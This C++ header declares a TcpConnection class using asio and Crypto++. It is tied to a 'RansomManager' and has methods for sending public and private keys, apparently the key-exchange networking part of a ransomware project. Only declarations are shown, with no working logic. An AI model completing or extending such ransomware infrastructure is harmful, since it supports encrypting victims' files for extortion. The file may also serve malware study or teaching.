#pragma once
#include <memory>
#include <asio.hpp>
#include <iostream>
#include <cryptopp/filters.h>
#include <cryptopp/base64.h>
#include <memory>

#include <iostream>

#include "Commands.h"
#include "RansomManager.h"


class TcpConnection : public std::enable_shared_from_this<TcpConnection>
{
public:
	typedef std::shared_ptr<TcpConnection> pointer;

private:
	asio::ip::tcp::socket socket_;
	RansomManager& ransomManager_;

public:
	static pointer create(asio::io_service& io_service, RansomManager& ransomManager);
	
	asio::ip::tcp::socket& socket();

	void start();
	void sendPublicKey();
	void sendPrivateKey();

private:
	TcpConnection(asio::io_service& io_service, RansomManager& ransomManager);
};

